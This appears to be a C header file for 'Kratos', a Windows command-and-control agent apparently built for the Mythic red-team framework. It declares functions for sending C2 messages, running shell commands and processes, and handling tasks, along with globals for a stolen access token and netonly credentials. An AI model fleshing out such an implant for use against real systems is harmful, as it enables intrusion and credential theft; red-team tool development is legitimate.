#ifndef KRATOS_UTILS_H
#define KRATOS_UTILS_H

#include <stddef.h>
#include <stdio.h>
#include <windows.h>
#include "config.h"

#if DEBUG
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
    fprintf(stdout, "[DEBUG] ");                                               \
    fprintf(stdout, __VA_ARGS__);                                              \
    fprintf(stdout, "\n");                                                     \
    fflush(stdout);                                                            \
  } while (0)
#else
#define DEBUG_PRINT(...) do {} while (0)
#endif

/* Primary token stolen via steal_token, NULL if none. */
extern HANDLE g_stolen_token;
extern int g_netonly_active;
extern char g_netonly_username[256];
extern char g_netonly_domain[256];
extern char g_netonly_password[512];

char *base64_encode(const unsigned char *src, size_t len);
char *base64_decode(const char *src, size_t len);
unsigned char *base64_decode_bin(const char *src, size_t len, size_t *out_len);
char *send_c2_message(const char *json_msg);
char *execute_shell(const char *cmd);
char *execute_process(const char *executable, const char *arguments);
char *ConsoleOutputToUTF8(const char *input);
void extract_json_string(const char *json, const char *key, char *buffer,
                         size_t buffer_size);
char *json_escape(const char *str);
char *
process_mythic_response(const char *b64_resp,
                        size_t b64_len); // Returns malloc'd JSON string or NULL
void send_task_response(const char *task_id, const char *raw_output);
int get_integrity_level();
void get_current_display_user(char *display_buffer, size_t size);
void clear_netonly_state(void);

#endif // KRATOS_UTILS_H
